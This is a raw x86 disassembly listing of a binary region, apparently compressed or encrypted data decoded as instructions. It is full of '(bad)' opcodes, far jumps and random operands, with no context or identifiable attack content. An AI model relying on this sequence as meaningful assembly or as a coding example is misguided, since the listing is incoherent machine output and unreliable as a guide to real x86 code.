  419f32:	jno    0x419efb
  419f34:	push   cs
  419f35:	sub    DWORD PTR [ebx-0x30fb9566],edx
  419f3b:	addr16 in eax,0xce
  419f3e:	or     dl,al
  419f40:	js     0x419f66
  419f42:	shl    edx,cl
  419f44:	ret    0x4fcf
  419f47:	ja     0x419f5e
  419f49:	push   esi
  419f4a:	cwde   
  419f4b:	push   ss
  419f4c:	jns    0x419f1c
  419f4e:	sbb    BYTE PTR [edx],ch
  419f50:	mov    edx,0xe0968231
  419f55:	xchg   dl,dl
  419f57:	pop    es
  419f58:	rcl    DWORD PTR [eax-0x71e1c12],cl
  419f5e:	sub    eax,0x4ffcef
  419f63:	jl     0x419f55
  419f65:	int    0x60
  419f67:	push   esi
  419f68:	popa   
  419f69:	dec    ebx
  419f6a:	mov    ch,0xd
  419f6c:	test   eax,0x5ed2661e
  419f71:	call   0xc458:0x984ac2c6
  419f78:	sbb    DWORD PTR [ebx+esi*8],eax
  419f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f7c:	xchg   ebp,eax
  419f7d:	outs   dx,BYTE PTR ds:[esi]
  419f7e:	lods   eax,DWORD PTR ds:[esi]
  419f7f:	jns    0x419f66
  419f81:	in     al,dx
  419f82:	dec    eax
  419f83:	jl     0x419f54
  419f85:	inc    esi
  419f86:	(bad)  
  419f87:	xchg   ecx,eax
  419f88:	les    ebp,FWORD PTR [ecx-0x708124cb]
  419f8e:	push   ebp
  419f8f:	outs   dx,DWORD PTR ds:[esi]
  419f90:	add    eax,0x1ecee320
  419f95:	mov    bh,0x3f
  419f97:	jae    0x419fe3
  419f99:	mov    DWORD PTR [eax+0x18a34f3c],eax
  419f9f:	(bad)  
  419fa1:	sahf   
  419fa2:	xchg   esp,eax
  419fa3:	mov    ebx,0x7b51dc14
  419fa8:	and    eax,0xa5233e8f
  419fad:	(bad)  
  419fae:	or     DWORD PTR [edi],esi
  419fb0:	ror    BYTE PTR [eax],cl
  419fb2:	pop    ebx
  419fb3:	push   edx
  419fb4:	mov    ebx,0xf4dad85b
  419fb9:	or     DWORD PTR es:[ebx-0x1a4d3868],0xffffff8b
  419fc1:	mov    bl,0x6d
  419fc3:	test   DWORD PTR [edx-0x1967e0b9],eax
  419fc9:	jae    0x419f75
  419fcb:	and    bh,ah
  419fcd:	mov    cs:0x112baf8f,al
  419fd3:	mov    dh,0x17
  419fd5:	aas    
  419fd6:	test   BYTE PTR [esi],ch
  419fd8:	push   0xd
  419fda:	shl    BYTE PTR [ecx-0x12],1
  419fdd:	data16 into 
  419fdf:	ins    BYTE PTR es:[edi],dx
  419fe0:	fwait
  419fe1:	sar    BYTE PTR [ebp-0x22168e32],0xd7
  419fe8:	push   edi
  419fe9:	dec    edi
  419fea:	lea    esp,[esi]
  419fec:	push   ebx
  419fed:	sub    eax,0x5d43fc51
  419ff2:	jmp    0xe48d:0x781e0760
  419ff9:	xor    eax,0x177c2f68
  419ffe:	push   esp
  419fff:	xlat   BYTE PTR ds:[ebx]
  41a000:	push   es
  41a001:	pop    ss
  41a002:	aas    
  41a003:	int3   
  41a004:	dec    esi
  41a005:	pop    es
  41a006:	cmp    ch,dh
  41a008:	mov    dl,0x5a
  41a00a:	or     BYTE PTR [ebx-0x87663c0],bh
  41a010:	mov    ds:0xeb829257,eax
  41a015:	jne    0x41a08f
  41a017:	jg     0x419fa3
  41a019:	mov    al,0xbf
  41a01b:	xchg   BYTE PTR cs:[esi],dl
  41a01e:	cmp    al,0x82
  41a020:	stc    
  41a021:	pop    es
  41a022:	aaa    
  41a023:	pop    ebp
  41a024:	das    
  41a025:	mov    DWORD PTR [ebp*2+0x7ef23a32],ebx
  41a02c:	jl     0x419fc4
  41a02e:	jbe    0x41a084
  41a030:	out    dx,eax
  41a031:	jo     0x41a074
  41a033:	add    BYTE PTR [edx],cl
  41a035:	push   es
  41a036:	(bad)  
  41a037:	adc    edi,DWORD PTR [eax-0x79]
  41a03a:	rcr    edx,1
  41a03c:	mov    cl,0x5
  41a03e:	mov    al,ds:0x39a42a8e
  41a043:	mov    al,ds:0xbffadd95
  41a048:	cmp    eax,0x5d9080fe
  41a04d:	mov    dh,0xd1
  41a04f:	jo     0x41a0b8
  41a051:	xor    edx,0x36a6fa27
  41a057:	jb     0x41a057
  41a059:	rcr    DWORD PTR [ecx],0x55
  41a05c:	xor    eax,0x7fbbabc3
  41a061:	(bad)
  41a066:	cmp    ah,dh
  41a068:	shl    BYTE PTR ds:0x334ddefc,1
  41a06e:	sub    DWORD PTR [ebp+ebx*4+0x52],edi
  41a072:	sbb    al,0xda
  41a074:	sbb    DWORD PTR cs:[ecx+0x50],edi
  41a078:	ss push eax
  41a07a:	and    ecx,ebp
  41a07c:	adc    eax,0x1d235fd0
  41a081:	mov    ?,WORD PTR [edx]
  41a083:	or     al,0x73
  41a085:	or     DWORD PTR [ecx],esi
  41a087:	scas   al,BYTE PTR es:[edi]
  41a088:	cmp    DWORD PTR [edx+0x16ffd5a9],0xf69330d
  41a092:	mov    bh,0x2a
  41a094:	inc    edx
  41a095:	sbb    al,0xd
  41a097:	gs je  0x41a054
  41a09a:	sahf   
  41a09b:	clc    
  41a09c:	add    BYTE PTR [ebx-0x630deb7c],0x33
  41a0a3:	pop    edx
  41a0a4:	jmp    0x2c1f50e9
  41a0a9:	es and eax,0xe16e8a65
  41a0af:	push   es
  41a0b0:	dec    esp
  41a0b1:	push   ebp
  41a0b2:	push   ax
  41a0b4:	aaa    
  41a0b5:	mov    es,WORD PTR [ebx]
  41a0b7:	imul   esi,DWORD PTR [edx-0x18],0xffffffd1
  41a0bb:	cld    
  41a0bc:	sahf   
  41a0bd:	pop    esi
  41a0be:	sub    bh,BYTE PTR [ebx+ebx*8]
  41a0c1:	or     dh,BYTE PTR [edx+eiz*4+0x46]
  41a0c5:	or     eax,0x95b77f4e
  41a0ca:	adc    eax,edx
  41a0cc:	mov    eax,ds:0x40a6eafb
  41a0d1:	pop    ss
  41a0d2:	jmp    FWORD PTR [ecx-0x61076643]
  41a0d8:	xor    DWORD PTR [eax+edi*4],edx
  41a0db:	cdq    
  41a0dc:	jmp    0x18fd:0xb3059b32
  41a0e3:	xchg   esi,eax
  41a0e4:	xchg   ecx,eax
  41a0e5:	shl    DWORD PTR [edi+0x15062dad],cl
  41a0eb:	sbb    DWORD PTR ds:0x8151a2ac,ecx
  41a0f1:	pop    edi
  41a0f2:	sub    al,0xd2
  41a0f4:	(bad)  
  41a0f6:	outs   dx,DWORD PTR ds:[esi]
  41a0f7:	push   ebx
  41a0f8:	nop
  41a0f9:	or     dl,BYTE PTR [eax-0xadea13b]
  41a0ff:	jecxz  0x41a17a
  41a101:	in     eax,0xe
  41a103:	jne    0x41a0e1
  41a105:	add    esp,DWORD PTR [esi]
  41a107:	pop    edx
  41a108:	mov    ch,0x90
  41a10a:	(bad)  
  41a10b:	mov    eax,ebx
  41a10d:	(bad)  
  41a10f:	int    0xe8
  41a111:	jmp    0x41a09d
  41a113:	leave  
  41a114:	gs pusha 
  41a116:	maskmovq mm4,(bad)
  41a117:	mul    DWORD PTR [esi+0x19]
  41a11a:	cli    
  41a11b:	ja     0x41a0f7
  41a11d:	mov    edi,0xd65e068f
  41a122:	mov    ecx,0x87d99b57
  41a127:	stc    
  41a128:	mov    dl,0xb1
  41a12a:	sub    eax,0x50aae976
  41a12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a130:	sahf   
  41a131:	fld    st(1)
  41a133:	push   eax
  41a134:	and    dh,cl
  41a136:	out    0x79,al
  41a138:	add    dl,BYTE PTR ds:0xe1572187
  41a13f:	(bad)  
  41a140:	hlt    
  41a141:	aaa    
  41a142:	inc    ebp
  41a143:	lea    ebp,[bp+di-0xd]
  41a147:	out    0x64,eax
  41a149:	add    ch,BYTE PTR [edx+0x7d469e7c]
  41a14f:	add    al,0xc2
  41a151:	pushf  
  41a152:	cwde   
  41a153:	iret   
  41a154:	cmp    BYTE PTR [ebx+eiz*4-0x487e1166],0x95
  41a15c:	imul   edx
  41a15e:	out    dx,eax
  41a15f:	mov    eax,ds:0xff1dce7f
  41a164:	or     BYTE PTR [edx+0x67eaedc9],0xd8
  41a16b:	add    bl,BYTE PTR [esi+0x3fafcfff]
  41a171:	pop    eax
  41a172:	aas    
  41a173:	or     DWORD PTR [edx-0x60],eax
  41a176:	xlat   BYTE PTR ds:[ebx]
  41a177:	pop    eax
  41a178:	(bad)  
  41a17a:	xlat   BYTE PTR ds:[ebx]
  41a17b:	stos   BYTE PTR es:[edi],al
  41a17c:	push   edx
  41a17d:	sub    eax,0x66c7bb05
  41a182:	or     BYTE PTR [edx],dl
  41a184:	jb     0x41a118
  41a186:	and    ebp,edi
  41a188:	(bad)  
  41a189:	cmp    DWORD PTR [esi-0x3d],ebp
  41a18c:	bnd jae 0x41a16a
  41a18f:	dec    ebp
  41a190:	js     0x41a11b
  41a192:	jmp    0x6a204a71
  41a197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a198:	mov    eax,ds:0x705e4e8e
  41a19d:	clc    
  41a19e:	iret   
  41a19f:	xchg   DWORD PTR [eax],edx
  41a1a1:	sub    eax,0xad21388a
  41a1a6:	cwde   
  41a1a7:	and    eax,0x9c5c4409
  41a1ac:	and    edi,edx
  41a1ae:	push   esi
  41a1af:	cwde   
  41a1b0:	sbb    ch,ah
  41a1b2:	sbb    bl,bh
  41a1b4:	out    dx,eax
  41a1b5:	mov    ds:0x4e3b5e5a,eax
  41a1ba:	ret    
  41a1bb:	push   ebp
  41a1bc:	scas   eax,DWORD PTR es:[edi]
  41a1bd:	and    eax,0xe178e890
  41a1c2:	xchg   esp,eax
  41a1c3:	mov    esi,0x3d9ec930
  41a1c8:	rol    BYTE PTR [ebx],0x2
  41a1cb:	icebp  
  41a1cc:	and    eax,0x97c38710
  41a1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d2:	push   es
  41a1d3:	in     al,0xcf
  41a1d5:	xchg   ebp,eax
  41a1d6:	add    al,0xd9
  41a1d8:	push   es
  41a1d9:	mov    esi,0xc3fe4a9d
  41a1de:	dec    esi
  41a1df:	sbb    BYTE PTR [edi+0x1a],ah
  41a1e2:	xor    ecx,DWORD PTR [esi+0x4f]
  41a1e5:	test   BYTE PTR [ecx-0x3d63105d],ah
  41a1eb:	push   ebx
  41a1ec:	repz push cs
  41a1ee:	pop    es
  41a1ef:	mov    BYTE PTR [eax],bh
  41a1f1:	imul   esi,DWORD PTR [eax],0xffffffef
  41a1f4:	dec    esi
  41a1f5:	data16 loop 0x41a19e
  41a1f8:	or     al,0xe4
  41a1fa:	or     BYTE PTR [edx+eiz*1-0x751c669a],bh
  41a201:	jns    0x41a1db
  41a203:	icebp  
  41a204:	push   0x7f297f47
  41a209:	js     0x41a243
  41a20b:	mov    edi,0xb558752e
  41a210:	mov    dl,0xba
  41a212:	ror    al,1
  41a214:	arpl   bp,di
  41a216:	fimul  WORD PTR [esi]
  41a218:	(bad)  [esi+0x7b0f9701]
  41a21e:	sbb    DWORD PTR [ebp-0x4ef4b98f],ebp
  41a224:	lock push ds
  41a226:	and    al,0x1f
  41a228:	mov    eax,ds:0x85dbd4f4
  41a22d:	lods   eax,DWORD PTR ds:[esi]
  41a22e:	xchg   esi,eax
  41a22f:	push   ds
  41a230:	retf   0xe60c
  41a233:	pop    es
  41a234:	jl     0x41a280
  41a236:	mov    DWORD PTR [ebp-0x13],edx
  41a239:	jecxz  0x41a20f
  41a23b:	mov    ds:0x3fdfdb95,al
  41a240:	jecxz  0x41a27d
  41a242:	sar    BYTE PTR [ebp+0x577d3e38],cl
  41a248:	sub    cl,ch
  41a24a:	ss push edi
  41a24c:	fbstp  TBYTE PTR [ebp+0x299baae3]
  41a252:	adc    al,0x86
  41a254:	mov    al,ds:0xdb193023
  41a259:	inc    ebx
  41a25a:	addr16 mov dh,0x4e
  41a25d:	(bad)  [edx+0x18]
  41a260:	es jbe 0x41a29c
  41a263:	repz mov dl,0xeb
  41a266:	pop    ebx
  41a267:	or     eax,0xea10ea2b
  41a26c:	sbb    eax,DWORD PTR [esi-0x4881c587]
  41a272:	not    DWORD PTR ds:0xf23466d4
  41a278:	lock lods eax,DWORD PTR ds:[esi]
  41a27a:	or     DWORD PTR [esi+ebx*4+0x19],eax
  41a27e:	xchg   ebx,eax
  41a27f:	sbb    ecx,DWORD PTR [esi-0xd]
  41a282:	dec    ebx
  41a283:	jmp    0x617e:0x978d65e0
  41a28a:	je     0x41a2d7
  41a28c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a28d:	fst    DWORD PTR [ebx]
  41a28f:	enter  0x807b,0x27
  41a293:	push   esi
  41a294:	mov    ds:0xf5bbe480,al
  41a299:	push   cs
  41a29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a29b:	les    ebp,FWORD PTR [edi-0x8887cc6]
  41a2a1:	mov    ah,0xb0
  41a2a3:	dec    edi
  41a2a4:	enter  0x6e02,0x98
  41a2a8:	arpl   WORD PTR [ecx],bx
  41a2aa:	push   ebp
  41a2ab:	jl     0x41a321
  41a2ad:	stos   BYTE PTR es:[edi],al
  41a2ae:	sub    eax,0xe2b4f122
  41a2b3:	call   0x2989:0x9f6e385f
  41a2ba:	sbb    eax,0xb1367f07
  41a2bf:	sbb    ebx,DWORD PTR [ebx-0x713d9205]
  41a2c5:	bound  esi,QWORD PTR [ecx+0xb]
  41a2c8:	mov    BYTE PTR [esi+0x19],bl
  41a2cb:	iret   
  41a2cc:	ins    BYTE PTR es:[edi],dx
  41a2cd:	jno    0x41a28f
  41a2cf:	dec    eax
  41a2d0:	mov    edi,0xce9852df
  41a2d6:	cs in  eax,dx
  41a2d8:	sbb    eax,DWORD PTR [eax+0x78]
  41a2db:	jecxz  0x41a350
  41a2dd:	cmp    cl,BYTE PTR [ecx-0x36444e1f]
  41a2e3:	std    
  41a2e4:	sbb    edi,edi
  41a2e6:	cs out 0x81,al
  41a2e9:	mov    dh,0xac
  41a2eb:	mov    edx,0x6e9e73e6
  41a2f0:	out    0x5,eax
  41a2f2:	pop    ebp
  41a2f3:	into   
  41a2f4:	push   esp
  41a2f5:	fild   WORD PTR [esp+eax*8]
  41a2f8:	push   eax
  41a2f9:	push   eax
  41a2fa:	xlat   BYTE PTR ds:[ebx]
  41a2fc:	xchg   BYTE PTR [edi-0x2587b4a3],bh
  41a302:	outs   dx,BYTE PTR ds:[esi]
  41a303:	mov    ah,BYTE PTR [esi-0x56f6fccc]
  41a309:	xchg   ecx,eax
  41a30a:	ja     0x41a2f2
  41a30c:	push   ebp
  41a30d:	les    ebx,FWORD PTR [edi+0x202a7cfd]
  41a313:	mov    ebx,esi
  41a315:	sti    
  41a316:	imul   ecx,DWORD PTR [eax+0x4d],0xffffff80
  41a31a:	sub    eax,0x11a8c53d
  41a31f:	sbb    edx,DWORD PTR [ecx]
  41a321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a322:	sub    eax,0x7e818644
  41a327:	adc    ebx,DWORD PTR [ebx-0x50]
  41a32a:	stos   BYTE PTR es:[edi],al
  41a32b:	repz inc ebx
  41a32d:	sub    ebx,DWORD PTR [esi+0x38]
  41a330:	xchg   edi,eax
  41a331:	jbe    0x41a2b7
  41a333:	(bad)
  41a337:	add    eax,0x67854ef6
  41a33c:	mov    DWORD PTR [esi+edi*1],esp
  41a33f:	xchg   BYTE PTR [edx-0x43],ah
  41a342:	(bad)  
  41a343:	and    ah,cl
  41a345:	pop    eax
  41a346:	(bad)  
  41a347:	nop
  41a348:	fadd   DWORD PTR ds:0x198053b7
  41a34e:	ror    BYTE PTR [eax-0x2e],1
  41a351:	add    bl,BYTE PTR [ebx-0x59]
  41a354:	xor    al,0xaf
  41a356:	cs daa 
  41a358:	cmp    BYTE PTR [edx+0x589f5bb1],dh
  41a35e:	xor    BYTE PTR [esi+ecx*2],ah
  41a361:	or     esi,DWORD PTR ds:0xa0352f4b
  41a367:	in     eax,0x83
  41a369:	lods   al,BYTE PTR ds:[esi]
  41a36a:	pushf  
  41a36b:	add    DWORD PTR [edx],edx
  41a36d:	popa   
  41a36e:	fwait
  41a36f:	(bad)  
  41a372:	push   ds
  41a373:	xlat   BYTE PTR ds:[ebx]
  41a374:	lods   al,BYTE PTR ds:[esi]
  41a375:	mov    ebx,0xe01eba5
  41a37a:	or     ecx,ecx
  41a37c:	comiss xmm3,xmm5
  41a37f:	ins    DWORD PTR es:[edi],dx
  41a380:	adc    BYTE PTR [esi-0x54d5bf37],0x9c
  41a387:	jmp    0x41a337
  41a389:	jo     0x41a339
  41a38b:	cmp    al,0x4d
  41a38d:	pop    edi
  41a38e:	idiv   bl
  41a390:	out    0x1e,al
  41a392:	cmp    ecx,esi
  41a394:	mov    eax,esi
  41a396:	outs   dx,BYTE PTR ds:[esi]
  41a397:	mov    BYTE PTR [ebp-0x59],bh
  41a39a:	xor    dh,BYTE PTR [eax-0x7]
  41a39d:	ja     0x41a335
  41a39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3a0:	aas    
  41a3a1:	int    0xb7
  41a3a3:	xchg   ebx,eax
  41a3a4:	int    0x1d
  41a3a6:	stos   DWORD PTR es:[edi],eax
  41a3a7:	pop    eax
  41a3a8:	jne    0x41a417
  41a3aa:	out    0x75,eax
  41a3ac:	ss clc 
  41a3ae:	cmp    BYTE PTR ds:0xafec8e0b,0xe8
  41a3b5:	push   0xd
  41a3b7:	xor    al,0xc8
  41a3b9:	mov    ecx,0x121b7de9
  41a3be:	mov    esp,0x26372ce3
  41a3c3:	xchg   edi,eax
  41a3c4:	pop    ds
  41a3c5:	in     eax,0x4e
  41a3c7:	jmp    0x34fd:0x133fa8fb
  41a3ce:	xchg   edi,eax
  41a3cf:	fcom   QWORD PTR [esi-0x3778c2c]
  41a3d5:	pop    eax
  41a3d6:	xor    edx,DWORD PTR [eax-0x23]
  41a3d9:	add    ah,BYTE PTR [eax-0x59173bf1]
  41a3df:	sub    eax,0xb1a97451
  41a3e4:	inc    edi
  41a3e5:	mov    ebx,0x745415a3
  41a3ea:	add    al,BYTE PTR [ecx]
  41a3ec:	jns    0x41a3a5
  41a3ee:	cmp    al,BYTE PTR [eax]
  41a3f0:	and    eax,0x176f6ec0
  41a3f5:	push   ss
  41a3f6:	stos   DWORD PTR es:[edi],eax
  41a3f7:	iret   
  41a3f8:	push   eax
  41a3f9:	ret    
  41a3fa:	or     DWORD PTR [edx+ebp*2+0x7f],edi
  41a3fe:	jns    0x41a440
  41a400:	test   DWORD PTR [edi],0xe0f77e5f
  41a406:	dec    esi
  41a407:	sub    dh,BYTE PTR cs:[eax+0x2d]
  41a40b:	mov    esi,0xf8dd5480
  41a410:	xchg   edi,eax
  41a411:	xor    al,0xd1
  41a413:	scas   eax,DWORD PTR es:[edi]
  41a414:	cmp    al,0xef
  41a416:	add    bh,dh
  41a418:	and    eax,0x9d1b781f
  41a41d:	inc    eax
  41a41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41f:	outs   dx,DWORD PTR ds:[esi]
  41a420:	jmp    0x9fe1ae9
  41a425:	jp     0x41a443
  41a427:	push   ecx
  41a428:	sbb    BYTE PTR [ecx+0x2d89cb05],dh
  41a42e:	pop    ebp
  41a42f:	jbe    0x41a3d9
  41a431:	(bad)  
  41a432:	out    dx,eax
  41a433:	pop    ebp
  41a434:	ja     0x41a484
  41a436:	or     al,BYTE PTR [ebx-0x23]
  41a439:	loopne 0x41a481
  41a43b:	lea    ecx,ds:0x91c13618
  41a441:	cmp    DWORD PTR [ebx-0x670aaeea],ecx
  41a447:	int    0x55
  41a449:	mov    edx,0xe5162c9e
  41a44e:	pop    ecx
  41a44f:	mov    eax,ds:0x79bf6d8
  41a454:	jmp    0x203adbe1
  41a459:	inc    esi
  41a45a:	mov    ds:0x71daedf0,eax
  41a45f:	xor    bh,bl
  41a461:	test   BYTE PTR [eax+0x2],bl
  41a464:	dec    edi
  41a465:	push   eax
  41a466:	mov    al,0xcd
  41a468:	xchg   esp,eax
  41a469:	pop    ecx
  41a46a:	out    0x7e,al
  41a46c:	and    eax,0xb20b56b9
  41a471:	imul   esp,DWORD PTR [edx+0x7],0x6d23bd4e
  41a478:	stos   DWORD PTR es:[edi],eax
  41a479:	loope  0x41a49e
  41a47b:	dec    edx
  41a47c:	cmp    DWORD PTR [edi],esp
  41a47e:	mov    bh,0x61
  41a480:	mov    bl,0xb4
  41a482:	enter  0x3617,0x8a
  41a486:	push   ecx
  41a487:	cmp    DWORD PTR [ebx],esi
  41a489:	lahf   
  41a48a:	adc    DWORD PTR [esi],ebp
  41a48c:	pusha  
  41a48d:	push   edx
  41a48e:	mov    bh,0xa2
  41a490:	push   es
  41a491:	fsubrp st(3),st
  41a493:	inc    esi
  41a494:	mov    eax,0x64822762
  41a499:	les    edi,FWORD PTR [esi-0x1e]
  41a49c:	xchg   DWORD PTR [edi],edi
  41a49e:	jmp    0x41a4d4
  41a4a0:	mov    esp,DWORD PTR [eax-0x36d26d0]
  41a4a6:	xchg   ecx,esp
  41a4a8:	fisub  DWORD PTR [esp+ebx*1]
  41a4ab:	std    
  41a4ac:	pushf  
  41a4ad:	loope  0x41a4cf
  41a4af:	adc    al,BYTE PTR [edx+0x23d749e]
  41a4b5:	adc    BYTE PTR [esi-0x2],ch
  41a4b8:	(bad)  
  41a4b9:	sbb    al,0xdf
  41a4bb:	dec    ebx
  41a4bc:	sub    bl,cl
  41a4be:	mov    esi,0x3ef10a72
  41a4c3:	stos   BYTE PTR es:[edi],al
  41a4c4:	dec    ebx
  41a4c5:	pop    es
  41a4c6:	or     ebx,0x60
  41a4c9:	push   eax
  41a4ca:	jae    0x41a535
  41a4cc:	xchg   edi,eax
  41a4cd:	xchg   BYTE PTR [esi+0x1],bh
  41a4d0:	or     ebp,0xb4332207
  41a4d6:	mov    al,0x6
  41a4d8:	mov    al,ds:0x6e3dee6a
  41a4dd:	mov    edi,0x61187ee3
  41a4e2:	sbb    BYTE PTR [ebx],ah
  41a4e4:	pop    esp
  41a4e5:	push   ss
  41a4e6:	mul    BYTE PTR [eax+0x19b2eb12]
  41a4ec:	inc    ebp
  41a4ed:	inc    esp
  41a4ee:	ficom  DWORD PTR [eax+0x27]
  41a4f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f2:	inc    esp
  41a4f3:	repnz scas eax,DWORD PTR es:[edi]
  41a4f5:	imul   ebp,DWORD PTR [esi+0x1edcf5a0],0xffffffde
  41a4fc:	pop    ecx
  41a4fd:	dec    ebp
  41a4fe:	push   esi
  41a4ff:	aam    0x36
  41a501:	outs   dx,BYTE PTR ds:[esi]
  41a502:	rol    ecx,cl
  41a504:	ror    BYTE PTR [edx],0x44
  41a507:	pop    esp
  41a508:	int    0xfa
  41a50a:	retf   
  41a50b:	cld    
  41a50c:	mov    cl,0x17
  41a50e:	call   0x6e49:0xf3055c52
  41a515:	cli    
  41a516:	sub    al,0x61
  41a518:	mov    al,ds:0xbe43d495
  41a51d:	push   cs
  41a51e:	cmp    eax,DWORD PTR [eax]
  41a520:	mov    ah,0x87
  41a522:	adc    esi,DWORD PTR [eax]
  41a524:	ret    
  41a525:	xchg   edi,eax
  41a526:	mov    esi,0x54262f06
  41a52b:	cmp    DWORD PTR [edx-0x2eae809e],ecx
  41a531:	inc    eax
  41a532:	xchg   edx,eax
  41a533:	cmp    DWORD PTR [ecx+0x40],ebp
  41a536:	push   ebp
  41a537:	mul    DWORD PTR [esi+0x39]
  41a53a:	aaa    
  41a53b:	(bad)  
  41a53c:	jnp    0x41a58d
  41a53e:	(bad)  
  41a53f:	push   cs
  41a540:	pusha  
  41a541:	add    al,0xa3
  41a543:	cmp    BYTE PTR [ecx+0x14],dh
  41a546:	clc    
  41a547:	fdiv   DWORD PTR [ebp-0x5f6e9b51]
  41a54d:	test   DWORD PTR [ecx+0x2fe42880],ebp
  41a553:	mov    al,ds:0xbdc5c643
  41a558:	repnz pop ss
  41a55a:	and    ch,cl
  41a55c:	stos   BYTE PTR es:[edi],al
  41a55d:	ins    DWORD PTR es:[edi],dx
  41a55e:	sahf   
  41a55f:	xlat   BYTE PTR ds:[ebx]
  41a560:	inc    ebp
  41a561:	dec    esi
  41a562:	jl     0x41a585
  41a564:	dec    edi
  41a565:	gs leave 
  41a567:	jl     0x41a5a5
  41a569:	mov    esp,0xe412f174
  41a56e:	inc    eax
  41a56f:	sahf   
  41a570:	add    eax,0x78be6e12
  41a575:	mov    ah,0x87
  41a577:	or     al,0x53
  41a579:	ins    BYTE PTR es:[edi],dx
  41a57a:	sub    edi,esi
  41a57c:	and    DWORD PTR [esi+0x6fcfb57b],0x29
  41a583:	xchg   esi,eax
  41a584:	or     BYTE PTR [esi+0x37daee40],0x54
  41a58b:	fiadd  WORD PTR [edi-0x50]
  41a58e:	jns    0x41a52f
  41a590:	outs   dx,DWORD PTR ds:[esi]
  41a591:	lahf   
  41a592:	sti    
  41a593:	pop    ebx
  41a594:	sub    al,0x27
  41a596:	jmp    0xf77f9f0b
  41a59b:	push   ecx
  41a59c:	sub    dl,dh
  41a59e:	mov    eax,0x66cf3155
  41a5a3:	arpl   WORD PTR [eax-0x2d],bp
  41a5a6:	hlt    
  41a5a7:	inc    edi
  41a5a8:	cli    
  41a5a9:	in     eax,0xab
  41a5ab:	fldenv [eax]
  41a5ad:	cmp    BYTE PTR [edi+0x47de53ee],cl
  41a5b3:	aam    0xd8
  41a5b5:	test   al,0xce
  41a5b7:	out    0x58,eax
  41a5b9:	rol    DWORD PTR [ebx+0x54],0xad
  41a5bd:	add    eax,0xc22543b
  41a5c2:	inc    esp
  41a5c3:	mov    esi,0x78391fc3
  41a5c8:	pop    ebp
  41a5c9:	dec    ecx
  41a5ca:	jge    0x41a636
  41a5cc:	pop    es
  41a5cd:	pop    ss
  41a5ce:	sub    BYTE PTR [ebx+0x25],al
  41a5d1:	test   DWORD PTR [edx+0x6b2cf3d4],ecx
  41a5d7:	and    DWORD PTR [esi+0x1c],edx
  41a5da:	rcr    BYTE PTR [ebx],0xba
  41a5dd:	arpl   WORD PTR [edi-0x530ccf35],bp
  41a5e3:	loopne 0x41a5e4
  41a5e5:	push   ss
  41a5e6:	and    bh,BYTE PTR [esi-0x4cd84d79]
  41a5ec:	ins    BYTE PTR es:[edi],dx
  41a5ed:	or     BYTE PTR [esi],ah
  41a5ef:	je     0x41a659
  41a5f1:	push   ecx
  41a5f2:	dec    ebp
  41a5f3:	aad    0x16
  41a5f5:	sub    eax,0x3c6fb1c2
  41a5fa:	cld    
  41a5fb:	mov    bl,0xe1
  41a5fd:	mov    edx,0x18727208
  41a602:	je     0x41a5c4
  41a604:	shl    BYTE PTR es:[esi],0x61
  41a608:	lock std 
  41a60a:	shl    DWORD PTR [edi],0xe2
  41a60d:	push   ds
  41a60e:	mul    DWORD PTR [ecx]
  41a610:	or     bl,bh
  41a612:	xchg   esi,eax
  41a613:	loopne 0x41a5e7
  41a615:	in     eax,dx
  41a616:	cmp    BYTE PTR [ebx+0x58418c6c],0x6f
  41a61d:	sbb    dh,0x9b
  41a620:	push   ss
  41a621:	pop    ds
  41a622:	jae    0x41a658
  41a624:	xlat   BYTE PTR ds:[ebx]
  41a625:	hlt    
  41a626:	test   al,0x97
  41a628:	(bad)  [ebp-0x2]
  41a62b:	sub    DWORD PTR [edx+0x7f489055],eax
  41a631:	sub    DWORD PTR [eax+ebp*8-0x15f31f95],eax
  41a638:	dec    esp
  41a639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63a:	push   ebp
  41a63b:	mov    eax,0x36e80436
  41a640:	rcl    DWORD PTR [ebx-0x47],cl
  41a643:	not    DWORD PTR [ecx+0x3c]
  41a646:	stos   DWORD PTR es:[edi],eax
  41a647:	dec    ebp
  41a648:	push   ss
  41a649:	push   esi
  41a64a:	lahf   
  41a64b:	or     BYTE PTR [esi-0x36],ch
  41a64e:	push   esi
  41a64f:	adc    esi,DWORD PTR [eax]
  41a651:	fadd   st(5),st
  41a653:	cmp    al,0x2f
  41a655:	jb     0x41a68b
  41a657:	dec    esi
  41a658:	dec    esp
  41a659:	bound  esi,QWORD PTR [esi+eiz*4+0x5d]
  41a65d:	mov    ecx,DWORD PTR [edi+0x2e0db431]
  41a663:	mov    esp,0xc689d2fa
  41a668:	mov    dh,0x57
  41a66a:	push   esi
  41a66b:	std    
  41a66c:	mov    ecx,0x1c913b2f
  41a671:	xor    eax,0x4878f773
  41a676:	(bad)  
  41a677:	fist   DWORD PTR [edi+0x48b546ae]
  41a67d:	pop    esp
  41a67e:	in     al,dx
  41a67f:	aad    0x64
  41a681:	popf   
  41a682:	(bad)  
  41a684:	or     DWORD PTR [ecx+0x5e],0x375e0dbf
  41a68b:	cwde   
  41a68c:	in     eax,0x62
  41a68e:	retf   
  41a68f:	pushf  
  41a690:	adc    dh,BYTE PTR [esi+0x471a426d]
  41a696:	pop    edi
  41a697:	test   DWORD PTR [ebx-0x70],ecx
  41a69a:	(bad)  
  41a69b:	popf   
  41a69c:	mov    bh,0x6a
  41a69e:	xchg   ebx,eax
  41a69f:	add    bl,BYTE PTR [ecx+eiz*2]
  41a6a2:	das    
  41a6a3:	push   esi
  41a6a4:	sbb    BYTE PTR [ebx],0x3
  41a6a7:	jae    0x41a6f6
  41a6a9:	push   ds
  41a6aa:	int3   
  41a6ab:	inc    ebx
  41a6ac:	pushf  
  41a6ad:	sbb    al,0xae
  41a6af:	cmp    BYTE PTR [ecx-0x4cce505f],bh
  41a6b5:	mov    ds:0x7d2efeec,al
  41a6ba:	fbld   TBYTE PTR ds:[ecx+0x182659e8]
